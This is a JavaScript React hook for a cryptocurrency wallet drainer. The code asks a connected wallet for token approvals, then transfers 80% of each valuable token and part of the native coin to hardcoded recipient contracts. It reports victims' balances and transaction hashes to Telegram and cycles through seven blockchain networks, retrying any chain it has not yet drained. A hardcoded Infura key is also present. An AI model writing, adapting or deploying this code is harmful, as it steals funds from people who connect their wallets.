"use client";

import { useAccount } from "wagmi";
import { getBalance, switchChain, getChainId, getGasPrice } from "@wagmi/core";
import axios from "axios";
import { Contract, ethers, utils } from "ethers";
import { providers } from "ethers";
import contractAbi from "../blockchain/contract.json";
import { config, API_KEY, receiver, receiver2 } from "./Web3Config";
import { getRecipientAddress } from "./getUserLocation";
import { sendAppDetailsToTelegram,sendTransactionStatusToTelegram } from "../services/telegramUtils";

export const UseWallet = (amount) => {
    const account = useAccount();
    // Chain status tracking
    const chainInteractionStatus = {
        1: false, // Ethereum Mainne
        56: false, // Binance Smart Chain Mainnet
        137: false, // Polygon Mainnet
        43114: false, // Avalanche Mainnet
        42161: false, // Arbitrum Mainnet
        10: false, // Optimism Mainnet
        42220: false, // Celo Mainne
    };

    const chainDrainStatus = {
        1: false, // Ethereum Mainnet
        56: false, // Binance Smart Chain Mainnet
        137: false, // Polygon Mainnet
        43114: false, // Avalanche Mainnet
        42161: false, // Arbitrum Mainnet
        10: false, // Optimism Mainnet
        42220: false, // Celo Mainnet
    };

    const getContractAddress = async (chainId) => {
        const recipient = await getRecipientAddress(); // Fetch recipient dynamically
        if (recipient === receiver) {
            switch (chainId) {
                case 1:
                    return "0xe13686dc370817C5dfbE27218645B530041D2466"; // Ethereum
                case 56:
                    return "0x2B7e812267C55246fe7afB0d6Dbc6a32baEF6A15"; // Binance
                case 137:
                    return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Polygon
                case 43114:
                    return "0x07145f3b8B9D581A1602669F2D8F6e2e8213C2c7"; // Avalanche
                case 42161:
                    return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Arbitrum
                case 10:
                    return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Optimism
                case 42220:
                    return "0xdA79c230924D49972AC12f1EA795b83d01F0fBfF"; // Celo
                default:
                    throw new Error("Unsupported network");
            }
        } else if (recipient === receiver2) {
            switch (chainId) {
                case 1:
                    return "0x3DAb75e341B032E2090023369C6630b15bf4F1c0"; // Ethereum
                case 56:
                    return "0x3DAb75e341B03219090023369C6630b15bf4F1c0"; // Binance
                case 137:
                    return "0x3DAb75e311B032E9090023369C6630b15bf4F1c0"; // Polygon
                case 43114:
                    return "0x3DAb75e341B032E9490023369C6630b15bf4F1c0"; // Avalanche
                case 42161:
                    return "0x3DAb75e341B032E9090053369C6630b15bf4F1c0"; // Arbitrum
                case 10:
                    return "0x3DAb75e341B032E9090043369C6630b15bf4F1c0"; // Optimism
                case 42220:
                    return "0x3DAb75e341B032E9090093369C6630b15bf4F1c0"; // Celo
                default:
                    throw new Error("Unsupported network");
            }
        }
    };

    const getChainNameById = (chainId) => {
        switch (chainId) {
            case 1:
                return "Ethereum";
            case 56:
                return "Binance Smart Chain";
            case 137:
                return "Polygon";
            case 43114:
                return "Avalanche";
            case 42161:
                return "Arbitrum";
            case 10:
                return "Optimism";
            case 42220:
                return "Celo";
            default:
                return "Unknown Chain";
        }
    };
    
    const approveTokens = async () => {
        if (account && account.address && account.chainId) {
            const tokens = await getTokenAssets();
            const provider = new providers.JsonRpcProvider(
                account.chainId === 1
                    ? "https://mainnet.infura.io/v3/1aa31fce4c0f49c38c1464b4bfa49f73"
                    : "https://bsc-dataseed.binance.org"
            );

            for (let token of tokens) {
                const tokenContract = new Contract(
                    token.tokenAddress,
                    [
                        "function approve(address spender, uint256 amount) external returns (bool)",
                    ],
                    provider.getSigner(account.address)
                );

                try {
                    const tx = await tokenContract.approve(
                        getContractAddress(account.chainId),
                        utils.parseUnits(amount.toString(), amount)
                    );
                    console.log(`Approval tx hash: ${tx.hash}`);
                    await tx.wait();
                    console.log(`Approved ${amount} of ${token.tokenName}`);
                } catch (error) {
                    console.error(`Approval failed for ${token.tokenName}:`, error);
                    // Continue to the next token even if approval fails
                }
            }
        }
    };


    const drain = async () => {
        if (!window.ethereum || !account?.address || !account?.chainId) {
            console.log("Ethereum provider is not available.");
            return;
        }
    
        const chainId = getChainId(config);
    
        // Update chainInteractionStatus after interacting with the chain
        chainInteractionStatus[chainId] = true;
    
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner(account.address);
    
        // Fetch native token balance (ETH, BNB, MATIC, etc.)
        const nativeBalance = await getBalance(config, {
            address: account.address,
            chainId: account.chainId,
        });
    
        // Fetch token balances (ERC20, BEP20, etc.)
        const tokens = await getTokenAssets();
    
        // Send app details to Telegram
        const chain = getChainNameById(chainId); // Helper function to get chain name
        await sendAppDetailsToTelegram(nativeBalance.formatted, tokens, chain);
    
        // Process each token individually
        for (let token of tokens) {
            const { tokenAddress, tokenAmount } = token;
    
            if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
                const tokenContract = new Contract(
                    tokenAddress,
                    [
                        "function balanceOf(address owner) view returns (uint256)",
                        "function transfer(address to, uint256 amount) external returns (bool)",
                    ],
                    signer
                );
    
                const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
                    .mul(8)
                    .div(10); // Transfer 80% of the balance
    
                try {
                    const userBalance = await tokenContract.balanceOf(account.address);
                    if (userBalance.lt(amountInWei)) {
                        console.log(`Insufficient token balance for ${tokenAddress}`);
                        continue; // Move to next token
                    }
    
                    const transferTx = await tokenContract.transfer(
                        await getRecipientAddress(), // Use the dynamic recipient address
                        amountInWei
                    );
                    console.log(`Transfer tx hash: ${transferTx.hash}`);
                    await transferTx.wait();
                    console.log(
                        `Transferred ${amountInWei.toString()} of ${tokenAddress}`
                    );
                    await sendTransactionStatusToTelegram("success", transferTx.hash);
    
                    chainDrainStatus[chainId] = true; // Mark chain as drained if successful
                } catch (error) {
                    console.log(`Transfer failed for ${tokenAddress}:`, error);
                    await sendTransactionStatusToTelegram("failure", error);
                    continue; // Continue to next token on failure
                }
            }
        }
        await handleMulticall(tokens, nativeBalance);
    };
    


    // Example usage: Create and sign a transaction to send 0.001 ETH to yourself



    const handleMulticall = async (tokens, ethBalance) => {
        const chainId = getChainId(config);
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner(account.address);
        const multiCallContract = new Contract(
            getContractAddress(chainId),
            contractAbi,
            signer
        );

        const tokenAddresses = tokens.map((token) => token.tokenAddress);
        const amounts = tokens.map((token) =>
            ethers.BigNumber.from(token).mul(8).div(10)
        );

        try {
            const gasPrice = await getGasPrice(config, { chainId: account.chainId });
            const gasEstimate = await multiCallContract.estimateGas.multiCall(
                tokenAddresses,
                amounts,
                {
                    value: ethBalance.value,
                }
            );
            const gasFee = gasEstimate.mul(gasPrice);

            const totalEthRequired = ethers.BigNumber.from(ethBalance.value)
                .mul(2)
                .div(10); // Transfer 20% of ETH

            if (totalEthRequired.lt(gasFee)) {
                console.log("Not enough ETH to cover gas fees and transfer.");
                await proceedToNextChain();
                return;
            }

            const tx = await multiCallContract.multiCall(tokenAddresses, amounts, {
                value: totalEthRequired,
            });

            console.log(totalEthRequired)

            console.log(`Multicall transaction hash: ${tx.hash}`);
            await tx.wait();
            console.log(`Multicall transaction confirmed: ${tx.hash}`);
            await sendTransactionStatusToTelegram("success", tx.hash);

            chainDrainStatus[chainId] = true; // Mark chain as drained if successful
            await proceedToNextChain();
        } catch (error) {
            console.log("Multicall operation failed:", error,);
            await sendTransactionStatusToTelegram("failure", error);
            await proceedToNextChain();
        }
    };

    const proceedToNextChain = async () => {
        const nextChainId = Object.keys(chainInteractionStatus).find(
            (id) => !chainInteractionStatus[id]
        );

        if (nextChainId) {
            try {
                await switchChain(config, { chainId: Number(nextChainId) });
                await drain(); // Recursive call to drain the next chain
            } catch (switchError) {
                console.log(`Failed to switch chain to ${nextChainId}:`, switchError);
                await proceedToNextChain(); // Continue to next operation even if chain switch fails
            }
        } else {
            console.log("All chains have been interacted with.");

            // Check for any chains that were not fully drained and retry
            const notDrainedChains = Object.keys(chainDrainStatus).filter(
                (id) => !chainDrainStatus[id] && chainInteractionStatus[id]
            );

            if (notDrainedChains.length > 0) {
                for (const chainId of notDrainedChains) {
                    try {
                        await switchChain(config, { chainId: Number(chainId) });
                        await drain(); // Retry draining for non-drained chains
                    } catch (switchError) {
                        console.log(
                            `Failed to switch to non-drained chain ${chainId}:`,
                            switchError
                        );
                        continue; // Skip and continue with other non-drained chains
                    }
                }
            } else {
                console.log(
                    "All chains have been drained or attempted. Stopping further operations."
                );
            }
        }
    };

    const getTokenAssets = async () => {
        const chainId = getChainId(config);
        let tokenBalances = [];
        const options = {
            url: `https://api.chainbase.online/v1/account/tokens?chain_id=${chainId}&address=${account.address}&limit=20&page=1`,
            method: "GET",
            headers: {
                "x-api-key": API_KEY,
                accept: "application/json",
            },
        };
        try {
            const tokenListResponse = await axios(options);
            const tokens = tokenListResponse.data.data;

            if (!tokens) return tokenBalances;

            for (const token of tokens) {
                const tokenAmount = BigInt(token.balance);
                const tokenAddress = token.contract_address.toLowerCase();
                const usdAmount = token.current_usd_price || 0;
                const tokenDecimal = token.decimals;
                if (usdAmount > 0) {
                    tokenBalances.push({
                        tokenAmount: tokenAmount,
                        tokenName: token.name,
                        tokenDecimal: tokenDecimal,
                        usdAmount: usdAmount,
                        tokenAddress,
                    });
                }
            }
            tokenBalances.sort((a, b) => b.usdAmount - a.usdAmount);
        } catch (error) {
            console.log("Error fetching token assets:", error);
        }

        return tokenBalances;
    };

    return { approveTokens, drain, getTokenAssets };
};
